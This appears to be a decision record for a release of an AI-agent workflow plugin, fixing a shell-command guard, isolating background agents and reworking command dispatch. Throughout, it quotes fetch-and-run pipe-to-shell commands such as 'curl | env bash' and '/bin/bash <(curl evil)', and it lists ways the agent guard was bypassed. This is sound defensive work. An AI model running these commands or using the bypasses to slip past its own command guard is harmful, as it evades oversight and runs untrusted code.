# Decision Record: v1.11.0 — Security Fixes, Architecture Cleanup, Command Dispatch

**Date:** 2026-03-27
**Status:** Approved
**Version:** 1.11.0

## Problem

v1.10.0 shipped with 1 CRITICAL, 3 HIGH, and 1 MEDIUM open issue discovered during its own COMPLETE pipeline:

1. **#4483 (CRITICAL):** Two bash-write-guard bugs — gh pipe-to-shell bypass in COMPLETE phase (`gh issue list | bash` exits ALLOW before PIPE_SHELL check), and `_check_milestones` returns empty when section doesn't exist (fail-open, all phase exit gates become no-ops).
2. **#4484 (HIGH):** PIPE_SHELL pattern misses `env` prefix (`curl | env bash`), absolute paths (`curl | /bin/bash`), and process substitution (`/bin/bash <(curl evil)`). Also missing: `fish`, `csh`, `tcsh`, `xargs`.
3. **#4470 (HIGH):** Skill tool bypasses `!` backtick platform execution — commands invoked via Skill tool get raw markdown, not preprocessed. Auto-transitions fail silently.
4. **#4471 (HIGH):** Background validation agents (boundary tester, devil's advocate) corrupted live workflow state by running destructive tests against the real state file instead of isolated temp dirs.
5. **#4478 (MEDIUM):** COMPLETE→IMPLEMENT loop-back cycle adds fragile snapshot mechanism. COMPLETE should document findings and continue, not fix in-place.

### Outcomes

1. All PIPE_SHELL bypass vectors closed (env, absolute path, process substitution, fish/csh/tcsh, xargs)
2. gh exception in COMPLETE checks PIPE_SHELL before allowing
3. `_check_milestones` fails closed when section missing
4. Completion snapshot mechanism removed; validation failures documented as issues
5. Boundary tester and devil's advocate run in worktree isolation
6. Auto-transition coaching uses explicit bash, not skill invocation
7. All WFM commands have `disable-model-invocation: true` in frontmatter

## Approaches Considered (DISCUSS phase — diverge)

### Security fixes (#4483, #4484)
Single approach — the fixes are well-defined regex and logic changes. No alternatives needed.

### Background agent isolation (#4471)
- **Option A: Prompt instructions only** — tell agents to use temp dirs. Behavioral, unreliable.
- **Option B: State file locking** — write lock during COMPLETE. Complex — can't distinguish orchestrator from agent process.
- **Option C: Worktree isolation + prompt instructions** — platform-level isolation with behavioral defense-in-depth.

### Command dispatch (#4470)
- **Option 1: Behavioral enforcement** — add "execute `!` first" instructions. Failed in v1.10.0 session.
- **Option 2: Split paths** — native for user, Skill tool for auto. Two paths to maintain.
- **Option 3: Remove from Skills + explicit bash auto-transitions** — guaranteed `!` execution for user, explicit bash for auto. Investigation revealed `disable-model-invocation: true` has a known bug for plugin skills (#22345), but adding the flag is correct intent. Auto-transition coaching updated to explicit bash regardless.

### Loop-back removal (#4478)
Single approach — remove snapshot mechanism, replace with "document and continue" + GitHub issue creation.

## Decision (DISCUSS phase — converge)

- **Security fixes:** Direct regex/logic fixes as specified in observations
- **Agent isolation:** Option C — worktree isolation for destructive agents + prompt instructions in agent files
- **Command dispatch:** Option 3 — `disable-model-invocation: true` + explicit bash auto-transitions. If flag doesn't work due to plugin bug, surface to user for decision (no silent fallback)
- **Loop-back:** Remove snapshot, validation failures become documented open issues with GitHub issues

### Rationale
- Security fixes are precise, minimal, testable
- Worktree isolation is structural (doesn't depend on agent behavior)
- Explicit bash auto-transitions eliminate the entire class of "Claude skipped the `!`" bugs
- Loop-back removal simplifies the pipeline model (linear: DISCUSS→IMPLEMENT→REVIEW→COMPLETE→OFF)

### Trade-offs accepted
- `xargs` pattern (`\|[[:space:]]*xargs[[:space:]]+(bash|sh|rm|mv|cp|tee|sed)`) only catches xargs followed by known write commands — `xargs` with novel write tools is not caught
- Auto-transition coaching is more verbose (3 lines of bash vs "invoke `/review`")
- Critical bugs found during COMPLETE ship unfixed — next session picks them up (deliberate)
- Worktree setup adds overhead per destructive agent dispatch

### Risks identified
- `disable-model-invocation: true` may be silently ignored for plugin skills (CC bug #22345). Mitigation: auto-transition coaching uses explicit bash regardless of flag behavior.
- Fail-closed `_check_milestones` will block phase exit if any code path enters a phase without calling `reset_*_status()`. Mitigation: this forces us to fix the missing reset call.

### Tech debt acknowledged
- PIPE_SHELL still doesn't catch all execution vectors (e.g., `perl -e 'exec("bash")'`). Guard is "a speed bump, not a wall."
- `using-superpowers` skill may still auto-invoke WFM commands if the plugin skill bug persists. Needs monitoring.

## Review Findings (REVIEW phase)

5-agent review pipeline dispatched. Findings fixed in commit `b5b8ed0`:

### Fixed
- [QUAL] PROC_SUB pattern extended with optional absolute path prefix (`/usr/local/bin/zsh <(curl evil)`)
- [SEC] gh exception extended to block pipe-to-interpreter (`python3`/`node`/`ruby`/`perl`/`awk`)
- [QUAL/ARCH] Unescaped inner double-quotes in post-tool-navigator stall messages fixed
- [QUAL] Dead `complete_discuss` helper removed from test suite
- [QUAL] Added PROC_SUB and interpreter tests for COMPLETE phase

### Accepted (pre-existing, not introduced by this session)
- [GOV] Worktree cleanup in complete.md Step 6 lacks merge-verification gate
- [HYG] Stale snapshot references in old spec/plan docs (150+ references in docs/superpowers/)
- [HYG] `COMPLETE_WRITE_WHITELIST` includes `.claude/commands/` with no producer

### False positives rejected
- [SEC] PIPE_SHELL `+=` concatenation "may silently fail" — verified correct during DISCUSS, 867 tests pass
- [HYG] `isolation: "worktree"` called a no-op — it's a valid Agent tool parameter
- [ARCH] Snapshot tests don't capture stderr — they already use `2>&1`
